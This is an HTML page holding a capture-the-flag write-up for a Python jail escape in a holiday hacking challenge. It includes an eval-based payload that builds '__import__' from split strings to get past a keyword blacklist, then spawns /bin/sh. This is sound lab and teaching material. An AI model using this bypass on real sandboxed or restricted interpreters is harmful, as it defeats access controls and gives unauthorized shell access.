@@ -1,0 +1,75 @@
+<!DOCTYPE html><head><link rel="stylesheet" href="style.css" type="text/css" media="all"/><style type="text/css">.code-black-background{color:#e0e0e0;background-color:#1f1f1f;}</style></head><body><div class="entry-title entry-title-no-feat-img">
+<h1>Elf #8 - SugarPlum Mary - Python Escape from LA Cranberry Pi terminal</h1>
+</div><div class="entry-content">
+<figure class="wp-block-image">
+  <img src="python_docker_challenge.gif" alt="" class="wp-image-791">
+</figure>
+<hr class="wp-block-separator">
+<h2>SugarPlum Mary: Python Escape from LA Cranberry Pi terminal</h2>
+<p>Hints given:
+  <br>Check out Mark Baggett&apos;s talk upstairs (https://www.youtube.com/watch?v=ZVx2Sxl3B9c)
+</p>
+<p>I&apos;m another elf in trouble,
+  <br>Caught within this Python bubble.
+  <br>
+  <br>Here I clench my merry elf fist -
+  <br>Words get filtered by a black list!
+  <br>
+  <br>Can&apos;t remember how I got stuck,
+  <br>Try it - maybe you&apos;ll have more luck?
+  <br>
+  <br>For this challenge, you are more fit.
+  <br>Beat this challenge - Mark and Bag it!
+  <br>
+  <br>-SugarPlum Mary
+  <br>
+  <br>To complete this challenge, escape Python and run ./i_escaped
+  <br>
+</p>
+<hr class="wp-block-separator">
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>Try out which commands work, and which do not work in Python</p>
+<pre class="wp-block-code code-black-background"><code>&gt;&gt;&gt; import
+Use of the command import is prohibited for this question.
+&gt;&gt;&gt; exec
+Use of the command exec is prohibited for this question.
+&gt;&gt;&gt; compile
+Use of the command compile is prohibited for this question.
+&gt;&gt;&gt; eval
+&lt;built-in function eval&gt;</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>Using the &apos;eval&apos; function, create an escape and spawn a shell</p>
+<pre class="wp-block-code code-black-background"><code>&gt;&gt;&gt; cmd = eval(&apos;__imp&apos; + &apos;ort__(&quot;os&quot;)&apos;)
+&gt;&gt;&gt; cmd.system(&quot;/bin/sh&quot;)
+$</code></pre>
+<div style="height:20px" aria-hidden="true" class="wp-block-spacer"></div>
+<p>Find and run &apos;i_escaped&apos; to complete the challenge</p>
+<pre class="wp-block-code code-black-background"><code>$ ls -al
+total 5440
+drwxr-xr-x 1 elf  elf     4096 Dec 14 16:41 .
+drwxr-xr-x 1 root root    4096 Dec 14 16:40 ..
+-rw-r--r-- 1 elf  elf      220 Aug 31  2015 .bash_logout
+-rw-r--r-- 1 elf  elf     3771 Aug 31  2015 .bashrc
+-rw-r--r-- 1 elf  elf      655 May 16  2017 .profile
+-rwxr-xr-x 1 root root 5547296 Dec 14 16:13 i_escaped
+$ ./i_escaped
+Loading, please wait......
+
+  ____        _   _
+ |  _ \ _   _| |_| |__   ___  _ __
+ | |_) | | | | __| &apos;_ \ / _ \| &apos;_ \
+ |  __/| |_| | |_| | | | (_) | | | |
+ |_|___ \__, |\__|_| |_|\___/|_| |_| _ _
+ | ____||___/___ __ _ _ __   ___  __| | |
+ |  _| / __|/ __/ _` | &apos;_ \ / _ \/ _` | |
+ | |___\__ \ (_| (_| | |_) |  __/ (_| |_|
+ |_____|___/\___\__,_| .__/ \___|\__,_(_)
+           |_|
+
+That&apos;s some fancy Python hacking -
+You have sent that lizard packing!
+
+-SugarPlum Mary
+
+You escaped! Congratulations!</code></pre>
+</div></body></html>
